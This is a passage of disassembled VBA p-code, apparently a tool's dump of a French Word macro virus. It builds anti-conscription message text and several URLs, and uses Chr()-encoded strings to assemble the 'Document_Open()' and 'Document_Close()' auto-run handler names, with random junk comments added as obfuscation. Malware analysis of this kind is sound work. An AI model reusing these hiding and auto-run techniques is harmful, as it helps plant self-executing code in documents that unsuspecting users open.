' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "attends"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "lui."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j5 
' 	BoS 0x0000 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k7 
' 	BoS 0x0000 
' 	Ld k7 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k7 
' 	QuoteRem 0x001F 0x0008 " esklext"
' Line #142:
' 	LineCont 0x000C 20 00 00 00 25 00 00 00 32 00 00 00
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e8 
' 	BoS 0x0000 
' 	Ld e8 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e8 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0012 "http://sn.agat.net"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b9 
' 	QuoteRem 0x006E 0x000D " yiqvxylqcxdi"
' Line #143:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0022 "http://altern.org/gigm/service.htm"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a7 
' 	QuoteRem 0x003E 0x0006 " geeqr"
' Line #144:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x001B "http://www.donquichotte.com"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d6 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0020 "http://www.multimania.com/antisn"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c5 
' 	QuoteRem 0x0074 0x0005 " ygjr"
' Line #145:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "Oui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Emploi,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Oui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "armée"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e2 
' 	QuoteRem 0x009B 0x0010 " prkcsisrqpvrtiy"
' Line #146:
' 	LineCont 0x000C 27 00 00 00 31 00 00 00 6D 00 00 00
' 	Ld e2 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "métier,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Non"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	St e2 
' 	BoS 0x0000 
' 	Ld e2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "national"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sous"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "travail,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e2 
' 	BoS 0x0000 
' 	Ld e2 
' 	LitStr 0x0003 "Non"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "absurdité."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e2 
' 	BoS 0x0000 
' 	LitStr 0x0002 "Un"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "peu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "aide..."
' 	Add 
' 	St g1 
' 	BoS 0x0000 
' 	LitStr 0x0002 "Je"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "dois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "avouer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "j"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ai"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "peu"
' 	Add 
' 	St l3 
' 	QuoteRem 0x00E5 0x0010 " muygzzqefmzeixq"
' Line #147:
' 	LineCont 0x0008 17 00 00 00 19 00 00 00
' 	Ld l3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "mal"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "peaufiner"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "document"
' 	Add 
' 	St l3 
' 	QuoteRem 0x003E 0x000B " cbespxozxy"
' Line #148:
' 	Ld l3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0002 ")."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "Merci"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "m"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "aider"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l3 
' 	QuoteRem 0x0088 0x0006 " cdels"
' Line #149:
' 	LineCont 0x0004 1B 00 00 00
' 	Ld l3 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "peu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "améliorer..."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l3 
' 	QuoteRem 0x0023 0x0008 " linuges"
' Line #150:
' 	LineCont 0x000C 3D 00 00 00 4F 00 00 00 77 00 00 00
' 	LitStr 0x0007 "Version"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "finale"
' 	Add 
' 	St l9 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Voici"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "dernière"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "version"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n2 
' 	BoS 0x0000 
' 	Ld n2 
' 	LitStr 0x0003 "sur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "quoi"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "j"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ai"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "travaillé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ces"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "derniers"
' 	Add 
' 	St n2 
' 	BoS 0x0000 
' 	Ld n2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "temps"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0002 ")."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Tous"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n2 
' 	QuoteRem 0x0050 0x0007 " nrauux"
' Line #151:
' 	Ld n2 
' 	LitStr 0x0004 "avis"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "bienvenue"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n2 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Document"
' 	St m1 
' 	QuoteRem 0x0078 0x000C " cpkynsenirc"
' Line #152:
' 	LineCont 0x0008 1F 00 00 00 2D 00 00 00
' 	LitStr 0x0002 "Le"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "mystère"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "jour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "résoudre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h8 
' 	BoS 0x0000 
' 	Ld h8 
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "suivant:"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h8 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x004E 0x0007 " ruoqot"
' Line #153:
' 	LineCont 0x0008 2B 00 00 00 31 00 00 00
' 	FuncDefn (Private Sub f2())
' 	BoS 0x0000 
' 	LitStr 0x0004 "Lors"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "intervention"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "télévisée"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "22"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l5 
' 	QuoteRem 0x0011 0x000E " jjfqfdmkkczxh"
' Line #154:
' 	LineCont 0x0008 01 00 00 00 19 00 00 00
' 	Ld l5 
' 	LitStr 0x0007 "février"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "1996,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Jacques"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Chirac,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "Président"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	St l5 
' 	QuoteRem 0x0044 0x000E " renfgjivpiysg"
' Line #155:
' 	Ld l5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "République"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Chef"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Armées,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "proclamé:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l5 
' 	QuoteRem 0x009F 0x000E " xjmrpwnbwrhhc"
' Line #156:
' 	LineCont 0x000C 18 00 00 00 20 00 00 00 2C 00 00 00
' 	LitStr 0x0005 ""Nous"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "n"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "avons"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "besoin"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "appelés..."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "(Le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i1 
' 	QuoteRem 0x003F 0x000F " cjkrubwojrgzsg"
' Line #157:
' 	LineCont 0x0004 56 00 00 00
' 	Ld i1 
' 	LitStr 0x0009 "national)"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "devenu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "inégal"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "n"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	St i1 
' 	BoS 0x0000 
' 	Ld i1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "universel.""
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "National"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "ensuite"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "été"
' 	Add 
' 	St i1 
' 	BoS 0x0000 
' 	Ld i1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "supprimé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "tous..."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "presque:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i1 
' 	QuoteRem 0x00CA 0x000D " hjheatujzvae"
' Line #158:
' 	LineCont 0x0004 71 00 00 00
' 	LitStr 0x0005 "Alors"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "n"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "obligatoire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "gens"
' 	Add 
' 	St i7 
' 	BoS 0x0000 
' 	Ld i7 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "nés"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "après"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "1979,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "gens"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "nés"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "avant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i7 
' 	QuoteRem 0x001C 0x000C " xcfwyxhhwyz"
' Line #159:
' 	LineCont 0x0010 0B 00 00 00 20 00 00 00 39 00 00 00 3F 00 00 00
' 	Ld i7 
' 	LitStr 0x0004 "1979"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "peuvent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "encore"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "perdre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "emploi,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "appartement,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St i7 
' 	BoS 0x0000 
' 	Ld i7 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "famille"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sur"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "simple"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "ordre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "National."
' 	Add 
' 	St i7 
' 	QuoteRem 0x0086 0x000B " vnxqexsnse"
' Line #160:
' 	LineCont 0x0004 52 00 00 00
' 	LitStr 0x0002 "En"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "réalité,"
' 	Add 
' 	LitDI2 0x0020 
